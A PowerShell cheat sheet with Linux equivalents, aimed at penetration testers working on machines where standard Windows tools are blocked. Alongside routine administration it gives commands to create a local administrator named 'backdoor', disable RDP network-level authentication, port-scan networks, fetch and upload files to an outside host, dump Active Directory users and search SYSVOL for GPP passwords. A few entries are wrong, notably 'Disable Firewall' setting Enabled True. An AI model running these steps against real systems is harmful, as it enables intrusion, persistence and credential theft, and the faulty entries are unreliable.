# PowerShell 101

#### Using PowerShell <a id="using_powershell"></a>

**Format any output**

```text
..something.. | Format-List
..something.. | Format-Table
..something.. | ConvertTo-Csv
..something.. | ConvertTo-Json
..something.. | ConvertTo-HTML | Out-File out.html
```

**Paginated output**

PowerShell:

```text
..something.. | Out-Host -paging
..something.. | more
```

Linux equivalent:

```text
..something.. | more
..something.. | less
```

**Get command history**

PowerShell:

```text
Get-History
h
```

Linux equivalent \(Bash\):

```text
history
cat ~/.bash_history
```

**Search through command history**

PowerShell:

```text
h | sls <pattern>
```

Also `CTRL+R` history search.

Linux equivalent \(Bash\):

```text
history | grep -i <pattern>
```

Also `CTRL+R` history search.

**Record PowerShell session to file**

This will record all executed commands, input and output produced during the terminal session. This is useful for collecting evidences and to have complete record trail of all executed commands.

PowerShell:

```text
Start-Transcript c:\path\to\record.txt

# To stop recording
Stop-Transcript
```

Linux equivalent:

```text
script -f /path/to/record.txt

# To stop recording
exit
```

**Open a file using default associated program**

This is essentially equivalent to double-clicking on something

```text
Invoke-Item c:\path\to\item
ii c:\path\to\item

ii c:\path\to\image.jpg
ii c:\path\to\a\text\file.txt
ii c:\windows\system32\cmd.exe
```

### System Information <a id="system_information"></a>

**Get computer name**

PowerShell:

```text
$env:computername
```

Linux equivalent :

```text
hostname
```

**Check if computer is part of a domain**

```text
(Get-WmiObject -Class Win32_ComputerSystem).PartOfDomain
```

**Get workgroup name**

```text
(Get-WmiObject -Class Win32_ComputerSystem).Workgroup
```

**Check if system is 32-bit or 64-bit**

```text
[System.Environment]::Is64BitOperatingSystem
(Get-CimInstance -ClassName win32_operatingsystem).OSArchitecture
```

**Get total RAM installed**

```text
[Math]::Round((Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory/1GB)
```

**List of installed software**

Check `Program Files` directories:

```text
Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
```

Check `HKLM\Software` registry:

```text
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\Software | ft Name
```

**List of installed hotfixes**

```text
Get-HotFix
```

**List of installed PowerShell versions**

```text
(gp HKLM:\SOFTWARE\Microsoft\PowerShell\*\PowerShellEngine -Name PowerShellVersion).PowerShellVersion
```

**Currently running PowerShell version**

PowerShell:

```text
$PSVersionTable
```

Linux equivalent \(Bash\):

```text
Control+X Control+V
```

**Get environment variables**

PowerShell:

```text
Get-Childitem env:
gci env:
```

Linux equivalent:

```text
set
```

**Get system uptime**

PowerShell:

```text
[Timespan]::FromMilliseconds([Environment]::TickCount)
```

Linux equivalent :

```text
uptime
```

### Processes <a id="processes"></a>

**List processes**

PowerShell:

```text
Get-Process
ps
```

Linux equivalent:

```text
ps aux
```

**List processes matching process name**

PowerShell:

```text
ps <pattern>
```

Linux equivalent:

```text
pgrep -a <pattern>
```

**List processes matching a pattern**

PowerShell:

```text
ps | out-string -stream | select-string <pattern>
```

Linux equivalent:

```text
ps aux | grep <pattern>
pgrep -a -f <pattern>
```

**Kill process by PID**

PowerShell:

```text
Stop-Process -Id <PID>
kill <PID>

kill -Force <PID>
```

Linux equivalent:

```text
kill <PID>


kill -KILL <PID>
```

**Kill processes matching process name**

PowerShell:

```text
Get-Process <name> | Stop-Process
ps <name> | kill

ps notepad | kill
ps notepad | kill -Force
```

Linux equivalent:

```text
pkill <name>


pkill vim
pkill -KILL vim
```

### Filesystem <a id="filesystem"></a>

**Get available disk drives**

PowerShell:

```text
Get-PSDrive
Get-PSProvider -PSProvider FileSystem
gwmi Win32_Logicaldisk | ft
```

Linux equivalent:

```text
df -h
lsblk
```

**Print current working directory**

PowerShell:

```text
Get-Location
gl
```

Linux equivalent:

```text
pwd
```

**Open current directory in file manager**

PowerShell:

```text
Invoke-Item .
ii .
```

Linux equivalent \(GNOME\):

```text
nautilus .
```

**Navigate through filesystem**

PowerShell:

```text
Set-Location <path>
chdir <path>
si <path>
cd <path>
```

Linux equivalent:

```text
cd <path>
```

 **List all files in current directory**

PowerShell:

```text
Get-ChildItem
gci
dir
ls
```

Linux equivalent:

```text
ls -l
dir -l
echo *
```

**List hidden files too**

PowerShell:

```text
gci -Force
```

Linux equivalent:

```text
ls -la
```

**List only hidden files**

PowerShell:

```text
gci -Attributes !D+H
```

Linux equivalent:

```text
ls -a | grep "^\."
```

**List all files recursively**

PowerShell:

```text
gci -Recurse
gci -rec
gci -rec -depth 1
```

Linux equivalent:

```text
ls -Rl
find . -ls
find . -maxdepth 1 -ls
```

**Count files in the current working directory**

PowerShell:

```text
(gci).count
```

Linux equivalent:

```text
ls | wc -l
```

**List files in the current directory but exclude some folders**

PowerShell:

```text
gci -exclude dir1,dir2,file1
```

Linux equivalent:

```text
ls -l -I dir1 -I dir2 -I file1
```

**List only filenames without any other details**

PowerShell:

```text
(gci).name
```

Linux equivalent:

```text
ls
```

**Copy files**

PowerShell:

```text
Copy-Item <source> <destination>
copy <source> <destination>
cpi <source> <destination>
cp <source> <destination>
```

Linux equivalent:

```text
cp <source> <destination>
```

**Copy directory**

PowerShell:

```text
cp -rec <source> <destinaton>
```

Linux equivalent:

```text
cp -r <source> <destination>
```

**Move / rename files**

PowerShell:

```text
Move-Item <source> <destination>
move <source> <destination>
mi <source> <destination>
mv <source> <destination>
```

Linux equivalent:

```text
mv <source> <destination>
```

**Delete files or directories**

PowerShell:

```text
Remove-Item <path>
ri -force <path>
rm -force <path>
```

Linux equivalent:

```text
rm <path>
rm -f <path>
```

**Delete directory**

PowerShell:

```text
rm -recurse <dir>
rm -recurse -force <dir>
rm -rec -for <dir>
```

Linux equivalent:

```text
rm -r <dir>
rm -rf <dir>
```

**Get a checksum \(hash\) of a file**

PowerShell:

```text
Get-FileHash file.txt
Get-FileHash -Algorithm MD5 file.txt
```

Get only the hash value:

```text
(Get-FileHash file.txt).hash
```

Linux equivalent:

```text
sha256sum file.txt
md5sum file.txt
```

**Hide a file or directory**

```text
(get-item test.txt).Attributes += 'Hidden'
```

**Unhide a file or directory**

```text
(get-item test.txt -force).Attributes -= 'Hidden'
```

### Access Control <a id="access_control"></a>

Get access control list \(ACL\) for a given object. The object can be a file, a directory or a registry entry. These commands are useful when `cacls.exe` or `icacls.exe` commands are blocked.

**Get ACL of a file path**

```text
Get-Acl c:\target\path | Format-Table -Wrap
Get-Acl c:\target\path | ft -wrap

Get-Acl c:\target\path | Format-List
Get-Acl c:\target\path | fl
```

**Get ACL of a registry object**

```text
Get-Acl HKLM:\SYSTEM\CurrentControlSet\Services
Get-Acl HKLM:\SYSTEM\CurrentControlSet\Services | fl
```

**Copy permissions**

```text
Get-Acl \source\location | Set-Acl \destination\location
```

### Working with files and text <a id="working_with_files_and_text"></a>

**Read a file**

PowerShell:

```text
Get-Content file.txt
gc file.txt
cat file.txt
```

Linux equivalent:

```text
cat file.txt
```

**Sort file and remove duplicated lines**

PowerShell:

```text
Get-Content file.txt | Sort-Object -unique
gc file.txt | sort -u
```

Linux equivalent:

```text
cat file.txt | sort -u
sort -u <file.txt
```

**Read a file and remove empty lines**

PowerShell:

```text
(gc file.txt) | ? {$_.trim() -ne "" }
```

Linux equivalent:

```text
grep -v '^\s*$' file.txt
```

**Match pattern in a file \(grep\)**

PowerShell:

```text
gc file.txt | select-string pattern
gc file.txt | sls pattern
```

Linux equivalent:

```text
grep pattern file.txt
```

**Count number of lines in a file**

PowerShell:

```text
(gc file.txt).count
gc file.txt | measure -line
```

Linux equivalent:

```text
wc -l file.txt
```

**Get first 10 lines of a file \(head\)**

PowerShell:

```text
gc -head 10 file.txt
gc file.txt | select -first 10
```

Linux equivalent:

```text
head -10 file.txt
cat file.txt | head -10
```

**Get last 10 lines of a file \(tail\)**

PowerShell:

```text
gc -tail 10 file.txt
gc file.txt | select -last 10
```

Linux equivalent:

```text
tail -10 file.txt
cat file.txt | tail -10
```

**Get only the 10th line from a file**

PowerShell:

```text
(gc file.txt)[9]
gc file.txt | select -index 10
```

Linux equivalent:

```text

head -10 file.txt | tail -1
```

**Continuous read from a file \(wait for input\)**

PowerShell:

```text
gc -tail 10 -wait file.txt
```

Linux equivalent:

```text
tail -f file.txt
```

**Create an empty file**

PowerShell:

```text
Set-Content file.txt -Value $null
sc file.txt -Value $null
```

Linux equivalent:

```text
touch file.txt
```

**Read file and replace a string**

PowerShell:

```text
(gc file.txt).replace("abc","xyz")
```

Linux equivalent:

```text
sed -e 's/abc/xyz/g' <file.txt
```

**Read file and replace multiple strings**

PowerShell:

```text
(gc file.txt).replace("abc","xyz").replace("def","opq")
```

Linux equivalent:

```text
sed -e 's/abc/xyz/g;s/def/opq/g' <file.txt
```

**Read file and replace multiple strings \#2**

PowerShell:

```text
$a = gc file.txt
$a -replace "abc","xyz" -replace "def","opq"
```

Linux equivalent:

```text
cat file.txt | sed -e 's/abc/xyz/g' | sed -e 's/def/opq/g'
```

### Registry <a id="registry"></a>

These commands are useful when `reg.exe` command is disabled.

**List registry subkeys**

```text
ls HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion | select name
ls Registry::HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion | select name
(ls HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion).name
```

We can also use the `cd` command to browse the registry like a file system:

```text
cd HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion
(ls).name
cd ..
(ls).name
```

**Read all values under a registry subkey**

```text
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
gp "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
```

Also while browsing the registry:

```text
cd "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
gp .
```

**Read a specific value under a registry subkey**

Example to get a Windows version from registry:

```text
gp "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" | select ProductName
(gp "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").ProductName
```

Also while browsing the registry:

```text
cd "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
(gp .).ProductName
```

**Create a registry value**

```text
New-ItemProperty HKCU:\Software -name "test value" -value 123
```

Also while browsing the registry:

```text
cd "HKCU:\Software"
New-ItemProperty . -name "test value" -value 123
```

**Delete registry value**

```text
Remove-ItemProperty HKCU:\Software -name "test value"
rp HKCU:\Software -name "test value"
```

Also while browsing the registry:

```text
cd "HKCU:\Software"
rp . -name "test value"
```

**Create registry subkey**

```text
New-Item "HKCU:\software" -Name "test key"
ni "HKCU:\software" -Name "test key"
```

Also while browsing the registry:

```text
cd "HKCU:\Software"
ni . -Name "test key"
cd "test key"
```

**Delete registry subkey**

```text
Remove-Item "HKCU:\software\test key" -recurse
rm "HKCU:\software\test key" -recurse
rm "HKCU:\software\test key" -recurse -force
```

**Search for string in registry subkeys**

This will go recursively through registry and search for the given pattern in **registry subkeys**:

```text
$path = "HKCU:\"
$pattern = "pattern"
gci "$path" -rec -ea SilentlyContinue | sls "$pattern"
```

**Search for string in registry values**

This will go recursively through registry and search for the given pattern in **value names** or **value data**.

```text
$path = "HKCU:\"
$pattern = "pattern"
gci "$path" -rec -ea SilentlyContinue | % { if((gp $_.PsPath -ea SilentlyContinue) -match "$pattern") { $_.PsPath; $_ | out-string -stream | sls "$pattern" } }
```

### Services <a id="services"></a>

These cmdlets are useful when `sc.exe` command is disabled.

**List of services**

PowerShell:

```text
Get-Service
```

Linux equivalent:

```text
service --status-all
systemctl --type=service
```

**Check status of a service**

PowerShell:

```text
Get-Service <name>
Get-Service winrm | select *
```

Linux equivalent:

```text
service <name> status
service ssh status
```

**List of running / stopped services**

PowerShell:

```text
Get-Service | Where-Object {$_.Status -eq "Running"}
Get-Service | Where-Object {$_.Status -eq "Stopped"}
```

Linux equivalent:

```text
systemctl --type=service --state=active
systemctl --type=service --state=inactive
```

**Start / Stop a service**

PowerShell:

```text
Start-Service <name>
Stop-Service <name>
```

Linux equivalent:

```text
service <name> start
service <name> stop
```

### Local user management <a id="local_user_management"></a>

These cmdlets come handy when `whoami.exe` and `net.exe` commands are blocked.

**Whoami**

```text
[Security.Principal.WindowsIdentity]::GetCurrent() | select name
```

**List local users**

```text
Get-LocalUser
Get-LocalUser | ft Name,Enabled,LastLogon
```

**List of local administrators**

```text
Get-LocalGroupMember Administrators
```

**Create a new local administrative user**

```text
New-LocalUser "backdoor" -Password (ConvertTo-SecureString "P@ssw0rd" -AsPlainText -Force)
Add-LocalGroupMember -Group "Administrators" -Member "backdoor"
Add-LocalGroupMember -Group "Remote Desktop Users" -Member "backdoor"
```

### Network <a id="network"></a>

#### Local network diagnostics <a id="local_network_diagnostics"></a>

**Get list of network interfaces**

PowerShell:

```text
Get-NetIpInterface
```

Linux equivalent:

```text
ifconfig -a
ip addr show
```

**Get list of configured IP addresses**

This is useful when `ipconfig.exe` command is blocked.

PowerShell:

```text
Get-NetIPAddress
Get-NetIPAddress -InterfaceAlias Ethernet
Get-NetIPAddress -InterfaceIndex 1

Get-NetIPConfiguration
```

Linux equivalent:

```text
ifconfig -a
ifconfig eth0

ip addr show
ip addr show eth0
```

**ARP table**

See the list of known MAC addresses and corresponding IP addresses on the local network. This is useful when `arp.exe` command is disabled.

PowerShell:

```text
Get-NetNeighbor
```

Linux equivalent:

```text
arp -an
ip neigh
```

**Routing table**

See the routing table and the default gateway. This is useful when `netstat.exe` or `route.exe` commands are disabled.

PowerShell:

```text
Get-NetRoute

Find-NetRoute -RemoteIPAddress 8.8.8.8
```

Linux equivalent:

```text
route
netstat -nr
ip route show
```

**List of network connections \(Netstat\)**

These commands are useful when `netstat.exe` command is blocked. Note that PowerShell has separated netstat for TCP and UDP protocols.

**Netstat for TCP protocol**

PowerShell:

```text
Get-NetTCPConnection
Get-NetTCPConnection -RemotePort 443
Get-NetTCPConnection -LocalPort 443
Get-NetTCPConnection -State listen
```

Linux equivalent:

```text
netstat -tnape
netstat -tnape | grep ':443 '

netstat -ltnpe
```

**Netstat for UDP protocol**

PowerShell:

```text
Get-NetUDPEndpoint -verbose
```

Linux equivalent:

```text
netstat -unape
```

#### TCP/IP <a id="tcpip"></a>

**ICMP Ping**

This is useful when `ping.exe` command is blocked.

```text
Get-CIMinstance win32_pingstatus -Filter "address = '192.168.204.190' and Timeout=1000 and ResolveAddressNames=false" | select StatusCode
```

StatusCode = 0 means that the host is alive.

**Traceroute**

```text
Test-NetConnection -ComputerName 10.10.5.5 -TraceRoute
```

**Port check**

This will try to connect to the specified TCP port, but also will send ICMP ping:

```text
Test-NetConnection -ComputerName 10.10.10.1 -Port 445
tnc -ComputerName 10.10.10.1 -Port 445
```

**Port check \#2**

Faster port check without sending ICMP ping:

```text
New-Object System.Net.Sockets.TCPClient -ArgumentList 10.10.10.1,445
```

**Port scan a host**

Do a port scan of host with IP address 192.168.204.190 for selected ports:

```text
$ports = "21 22 23 25 53 80 88 111 139 389 443 445 873 1099 1433 1521 1723 2049 2100 2121 3299 3306 3389 3632 4369 5038 5060 5432 5555 5900 5985 6000 6379 6667 8000 8080 8443 9200 27017"
$ip = "192.168.204.190"
$ports.split(" ") | % {echo ((new-object Net.Sockets.TcpClient).Connect($ip,$_)) "Port $_ is open on $ip"} 2>$null 
```

**Port sweep of a network**

Do a port sweep of 10.10.0.x network for port 445:

```text
$port = 445
$net = "10.10.0."
0..255 | foreach { echo ((new-object Net.Sockets.TcpClient).Connect($net+$_,$port)) "Port $port is open on $net$_"} 2>$null
```

**Port sweep of a network \#2**

Using a minimalist port sweeper from our github:

* [https://github.com/InfosecMatter/Scripts/blob/master/portsweep.ps1](https://github.com/InfosecMatter/Scripts/blob/master/portsweep.ps1)
* See features and usage [here](https://github.com/InfosecMatter/Scripts).

#### DNS <a id="dns"></a>

**Get list of configured DNS servers**

PowerShell:

```text
Get-DnsClientServerAddress
```

Linux equivalent:

```text
cat /etc/resolv.conf
systemd-resolve --status
nmcli dev show | grep DNS
```

**DNS hostname lookup**

PowerShell:

```text
Resolve-DNSname google.com
(Resolve-DNSname google.com).ipaddress
```

Linux equivalent:

```text
host -t a google.com
dig google.com a +short
```

**DNS hostname lookup \#2**

PowerShell:

```text
[System.Net.Dns]::Resolve('google.com').AddressList.IPAddressToString
```

Linux equivalent:

```text
getent hosts google.com
```

**DNS hostname lookup \#3**

```text
[System.Net.Dns]::GetHostAddresses('google.com').IPAddressToString
```

**DNS reverse lookup**

PowerShell:

```text
Resolve-DNSname 8.8.8.8
(Resolve-DNSname 8.8.8.8).namehost
```

Linux equivalent:

```text
host -t ptr 8.8.8.8
dig -x 8.8.8.8 +short
```

**DNS reverse lookup \#2**

PowerShell:

```text
[System.Net.Dns]::Resolve('8.8.8.8').hostname
```

Linux equivalent:

```text
getent hosts 8.8.8.8
```

**DNS reverse lookup \#3**

```text
[System.Net.Dns]::GetHostEntry('8.8.8.8').HostName
```

**Mass DNS reverse** **lookup**

Perform reverse DNS lookup of 10.10.0.x subnet and save the list of found hostnames in the `hostnames.txt` file.

```text
$net = "10.10.0."
0..255 | foreach {Resolve-DNSname -ErrorAction SilentlyContinue $net$_ | ft NameHost -HideTableHeaders} | Out-String -Stream | where {$_ -ne ""} | tee hostnames.txt
```

**Mass DNS reverse** **lookup \#2**

Perform reverse DNS lookup of 10.10.0.x subnet and save output in IP HOSTNAME format in the `ip_hostname.txt` file.

```text
$net = "10.10.0."
0..255 | foreach {$r=(Resolve-DNSname -ErrorAction SilentlyContinue $net$_ | ft NameHost -HideTableHeaders | Out-String).trim().replace("\s+","").replace("`r","").replace("`n"," "); Write-Output "$net$_ $r"} | tee ip_hostname.txt
```

#### Network shared drives <a id="network_shared_drives"></a>

These cmdlets are useful when `net.exe` command is disabled.

**Enumerate local SMB/CIFS network shares**

```text
Get-WmiObject -class Win32_Share
```

**Enumerate local SMB/CIFS network shares \#2**

```text
Get-CimInstance -Class Win32_Share
```

**Enumerate local SMB/CIFS network shares \#3**

Alternate \(newer\) way using the [SmbShare](https://docs.microsoft.com/en-us/powershell/module/smbshare/) module:

```text
Get-SmbShare
```

**Enumerate remote SMB/CIFS network shares**

```text
Get-WmiObject -class Win32_Share -ComputerName <IP|hostname>
```

**Enumerate remote SMB/CIFS network shares \#2**

Alternate \(newer\) way using the [SmbShare](https://docs.microsoft.com/en-us/powershell/module/smbshare/) module via [PSSession](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_pssessions). Note that this requires that the remote computer has [PS Remoting](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enable-psremoting) enabled.

```text
Invoke-Command -ComputerName 'IP|hostname' -ScriptBlock {Get-SmbShare}
```

We can also list permissions who can mount the remote network shares using `Get-SmbShareAccess` like this:

```text
Invoke-Command -ComputerName 'IP|hostname' -ScriptBlock {(Get-SmbShare).name | % {Get-SmbShareAccess -Name $_}}
```

**Enumerate remote SMB/CIFS network shares \#3**

Another method using [SmbShare](https://docs.microsoft.com/en-us/powershell/module/smbshare/) module and [PS Remoting](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enable-psremoting), but this time via a [CIM session](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_cimsession).

```text
New-CimSession -ComputerName 'IP|hostname' -Credential $creds
```

Note the CIM session id. Now list the network shares via the CIM session like this:

```text
Get-SmbShare -CimSession $(Get-CimSession -id 1)
```

In the end close the CIM session:

```text
Remove-CimSession -id 1
```

**Access remote SMB/CIFS network drive**

Using instant mapping via `pushd` and `popd`:

```text
Push-Location \192.168.204.190\drive

# In the end disconnect from the network drive:
Pop-Location
```

**Access remote SMB/CIFS network drive \#2**

```text
$n = New-Object -ComObject "Wscript.Network"
$n.MapNetworkDrive("x:", "\192.168.204.190\Public")
x:

# In the end remove the network share:
$n.RemoveNetworkDrive("x:")
```

**Access remote SMB/CIFS network drive \#3**

This method works in PowerShell 3.0 and above.

```text
New-PSDrive -name mydrive -PSProvider FileSystem -root "\192.168.204.190\Public"
mydrive:

# In the end remove the network share:
Remove-PSDrive mydrive
```

**Access remote SMB/CIFS network drive \#4**

This method works in PowerShell 5.0 and above.

```text
New-SmbMapping -LocalPath x: -RemotePath \192.168.204.190\Public
x:

# In the end remove the network drive:
Remove-SmbMapping -LocalPath x: -force
```

**Access remote SMB/CIFS network drive \#5 using credentials**

```text
$n = New-Object -ComObject "Wscript.Network"
$n.MapNetworkDrive("x:", "\192.168.204.190\data", $true, 'domain\username', 'password')
x:

# In the end remove the network share:
$n.RemoveNetworkDrive("x:")
```

**List currently mapped network drives**

```text
(New-Object -ComObject WScript.Network).EnumNetworkDrives()
```

**Create a guest network drive**

PowerShell:

```text
new-item "c:\test\dir" -itemtype directory
New-SmbShare -Name "testdir" -Path "C:\test\dir" -FullAccess "Everyone","Guests","Anonymous Logon"

# To stop it afterwards:
Remove-SmbShare -Name "testdir" -Force
```

Linux equivalent:

```text
mkdir /new/dir
/opt/impacket/examples/smbserver.py testdir /new/dir

# To stop it, simply terminate it:
^C
```

#### HTTP data transfer <a id="http_data_transfer"></a>

**Download file**

Using [WebClient](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient) class:

```text
(New-Object System.Net.WebClient).DownloadFile("http://192.168.204.190/a.exe","c:\test\a.exe")
```

**Upload file**

This works out-of-the-box with [SimpleHTTPServerWithUpload.py](https://gist.github.com/UniIsland/3346170):

```text
(New-Object System.Net.WebClient).UploadFile("http://192.168.204.190/", "POST", "c:\test\file.zip");
```

**Download file \#2**

Using [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest) cmdlet:

```text
Invoke-WebRequest -Uri "http://192.168.204.190/a.exe" -OutFile "C:\test\a.exe"
wget -Uri "http://192.168.204.190/a.exe" -OutFile "C:\test\a.exe"
curl -Uri "http://192.168.204.190/a.exe" -OutFile "C:\test\a.exe"
iwr -Uri "http://192.168.204.190/a.exe" -OutFile "C:\test\a.exe"
```

**Upload file \#2**

```text
wget -Uri "http://192.168.204.190/" -InFile "C:\test\file.zip" -Method Post
wget -Uri "http://192.168.204.190/" -InFile "C:\test\file.zip" -Method Put
```

**Download file \#3**

Using [Invoke-RestMethod](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-restmethod) cmdlet:

```text
Invoke-RestMethod -Uri "http://192.168.204.190/file.exe" -OutFile "file.exe"
```

**Upload file \#3**

```text
Invoke-RestMethod -Uri "http://192.168.204.190/" -Method Post -InFile "C:\test\file.zip"
Invoke-RestMethod -Uri "http://192.168.204.190/" -Method Put -InFile "C:\test\file.zip"
```

**Download file \#4**

Using [BitsTransfer](https://docs.microsoft.com/en-us/powershell/module/bitstransfer/) cmdlet:

```text
Import-Module BitsTransfer
Start-BitsTransfer -source "http://192.168.204.190/a.exe" -destination "a.exe"
```

#### Firewall <a id="firewall"></a>

These cmdlets are useful when `netsh.exe` command is disabled.

**Get firewall policy to find out which one is currently enabled**

```text
Get-NetFirewallProfile
Get-NetFirewallProfile | select name,enabled
```

**Get firewall policy to find out which one is currently enabled \#2 via registry**

```text
cd HKLM:HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy
gp *Profile | select PSChildName,EnableFirewall
```

**List of firewall rules**

With this we can get complete list of firewall rules. Be prepared that the list is huge.

```text
Show-NetFirewallRule
```

**Enable Firewall**

```text
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True
```

**Disable Firewall**

```text
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True
```

**Allow Remote Desktop connections**

```text
# Allow RDP connections
(Get-WmiObject -Class "Win32_TerminalServiceSetting" -Namespace root\cimv2\terminalservices).SetAllowTsConnections(1)

# Disable NLA
(Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0)

# Allow RDP on the firewall
Get-NetFirewallRule -DisplayGroup "Remote Desktop" | Set-NetFirewallRule -Enabled True
```

**Whitelist an IP address**

```text
New-NetFirewallRule -Action Allow -DisplayName "myrule" -RemoteAddress 192.168.204.190

# Afterwards, remove the rule:
Remove-NetFirewallRule -DisplayName "myrule"
```

#### Other <a id="other"></a>

**List proxy settings**

```text
gp "Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

**Send email**

```text
Send-MailMessage -SmtpServer <smtp-server> -To joe@example.com -From sender@example.com -Subject "subject" -Body "message" -Attachment c:\path\to\attachment
```

### Active Directory <a id="active_directory"></a>

These cmdlets are useful when `net.exe` command is disabled and we cannot use [ActiveDirectory](https://docs.microsoft.com/en-us/powershell/module/activedirectory/) PowerShell module or any other modules.

**Get current AD domain**

```text
([adsisearcher]"").Searchroot.path
```

**Get current AD domain \#2**

```text
[System.DirectoryServices.ActiveDirectory.Domain]::GetComputerDomain().Forest.Name
```

**Get list of domain controllers**

```text
[System.DirectoryServices.ActiveDirectory.Domain]::GetComputerDomain().DomainControllers | select IPAddress
```

**Get list of domain controllers \#2 from DNS**

```text
Resolve-DNSName -type srv _ldap._tcp.<domain>
Resolve-DNSName -type srv _ldap._tcp.example.com

Resolve-DNSName -type srv _kerberos._tcp.<domain>
Resolve-DNSName -type srv _kerberos._tcp.example.com
```

**Get list of users from AD**

Using [ADSISearcher](https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.directorysearcher) class and the current domain:

```text
$a = [adsisearcher]”(&(objectCategory=person)(objectClass=user))”
$a.PropertiesToLoad.add(“samaccountname”) | out-null
$a.PageSize = 1
$a.FindAll() | % { echo $_.properties.samaccountname } > users.txt
```

**Get list of users from AD \#2**

Using [ADSI](https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.directoryentry) class and an arbitrary domain or organization unit. First check to see if we have the domain \(LDAP path\) right – test if we can identify one user:

```text
$s = New-Object System.DirectoryServices.DirectorySearcher([adsi]"LDAP://dc=domain,dc=com","(&(objectCategory=person)(objectClass=user))")
$s.FindOne()
```

If everything is fine, then dump all users from AD like this:

```text
$s = New-Object System.DirectoryServices.DirectorySearcher([adsi]"LDAP://dc=domain,dc=com","(&(objectCategory=person)(objectClass=user))")
$s.PropertiesToLoad.add(“samaccountname”) | out-null
$s.PageSize = 1
$s.FindAll() | % { echo $_.properties.samaccountname } > users.txt
```

**Get list of users from AD \#3 using credentials**

First check if the credentials work:

```text
$a = New-Object adsisearcher((New-Object adsi("LDAP://domain.com","domain\username","password")),"(&(objectCategory=person)(objectClass=user))")
$a.FindOne()
```

If everything is fine, then dump all users from AD like this:

```text
$a = New-Object adsisearcher((New-Object adsi("LDAP://domain.com","domain\username","password")),"(&(objectCategory=person)(objectClass=user))")
$a.PropertiesToLoad.add(“samaccountname”) | out-null
$a.PageSize = 1
$a.FindAll() | % { echo $_.properties.samaccountname } > users.txt
```

**Get list of computers from AD**

```text
$a = [adsisearcher]”(objectCategory=computer)”
$a.PropertiesToLoad.add(“dnshostname”) | out-null
$a.PageSize = 1
$a.FindAll() | % { echo $_.properties.dnshostname } > computers.txt
```

**Get AD password policy**

```text
([adsisearcher]"").Searchroot.minPwdLength
([adsisearcher]"").Searchroot.lockoutThreshold
([adsisearcher]"").Searchroot.lockoutDuration
([adsisearcher]"").Searchroot.lockoutObservationWindow
([adsisearcher]"").Searchroot.pwdHistoryLength
([adsisearcher]"").Searchroot.minPwdAge
([adsisearcher]"").Searchroot.maxPwdAge
([adsisearcher]"").Searchroot.pwdProperties
```

**Search manually for GPP cpassword**

Try this on every domain controller:

```text
pushd \example.com\sysvol
gci * -Include *.xml -Recurse -EA SilentlyContinue | select-string cpassword
popd
```

**Login attack against AD domain users**

Using a minimalistic AD login attack tool from our Github repository:

* [https://github.com/InfosecMatter/Scripts/blob/master/adlogin.ps1](https://github.com/InfosecMatter/Scripts/blob/master/adlogin.ps1)
* See features and usage [here](https://github.com/InfosecMatter/Scripts).

### AppLocker <a id="applocker"></a>

**Get current AppLocker policy rules**

```text
Get-AppLockerPolicy -Effective -Xml
Get-AppLockerPolicy -Effective -Xml | Set-Content ('applocker_current.xml')
```

**Show AppLocker statistics about allowed / denied events**

```text
Get-AppLockerFileInformation -EventLog -EventType Allow -Statistics
Get-AppLockerFileInformation -EventLog -EventType Denied -Statistics
```

**Set a new AppLocker policy**

```text
Set-AppLockerPolicy -XMLPolicy c:\path\to\new\policy.xml
```

### Scripting <a id="scripting"></a>

**Do something for each file in current directory**

PowerShell:

```text
foreach ($f in $(gci)) {echo $f.Name}
```

Linux equivalent:

```text
for f in *; do echo $a; done
```

**Do something for each line in a file**

PowerShell:

```text
gc file.txt | foreach { echo $_ }
```

Linux equivalent:

```text
while read a; do echo $a; done <file.txt
```

**Do something for each line in a file \#2**

PowerShell:

```text
foreach ($a in $(gc file.txt)) { echo $a }
```

Linux equivalent:

```text
cat file.txt | while read a; do echo $a; done
```

**Generate list of 10.0.10.x IP addresses**

PowerShell:

```text
1..255 | foreach{"10.0.10."+$_} > ips.txt
```

Linux equivalent:

```text
for a in {0..255}; do echo 10.0.10.$a; done > ips.txt
```

### Text encoding and decoding <a id="text_encoding_and_decoding"></a>

**DOS to UNIX**

This is to convert files created under Windows/DOS with carriage return as part of the newline \(`\r\n`\) to a Unix format, which only uses newline \(`\n`\).

```text
(gc file.txt -Raw).replace("`r`n","`n") | out-file -nonewline file.unix.txt
```

**UNIX to DOS**

```text
gc file.unix.txt > file.dos.txt
```

**UTF to ASCII**

```text
gc file.txt | out-file -encoding ASCII file.ascii.txt
```

**ASCII to UTF**

```text
gc file.txt | out-file -encoding UTF8 file.utf8.txt
```

**Base64 encode**

This is for encoding binary data into text form and vice versa.

```text
[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("Text to encode"))
```

**Base64 decode**

```text
